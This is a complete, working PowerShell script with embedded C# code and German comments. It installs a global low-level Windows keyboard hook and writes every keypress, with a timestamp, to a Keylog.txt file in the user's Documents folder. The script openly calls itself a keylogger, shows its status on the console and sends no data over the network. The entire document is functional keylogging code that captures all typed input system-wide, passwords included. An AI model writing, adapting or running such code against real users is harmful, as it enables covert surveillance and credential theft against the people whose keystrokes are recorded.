if (-not ("KeyboardHook" -as [type])) {
    Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;

public class KeyboardHook {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static string LogFilePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\Keylog.txt";

    public static void SetHook() {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    public static void Unhook() {
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            string key = ((Keys)vkCode).ToString();
            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            string line = string.Format("[{0}] {1}", timestamp, key);

            File.AppendAllText(LogFilePath, line + Environment.NewLine);
            Console.WriteLine(line);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
}
"@ -ReferencedAssemblies "System.Windows.Forms", "System.IO"
}

# Hook setzen
[KeyboardHook]::SetHook()

# Datei leeren oder neu anlegen
Set-Content -Path ([KeyboardHook]::LogFilePath) -Value "" -Encoding UTF8

Write-Host "Globaler Keyboard-Hook aktiv. Protokolliere in: $([KeyboardHook]::LogFilePath)"
Write-Host "Drücke Tasten... Beende mit STRG + C."

try {
    while ($true) {
        Start-Sleep -Milliseconds 100
    }
}
finally {
    [KeyboardHook]::Unhook()
    Write-Host "Keylogger gestoppt."
}
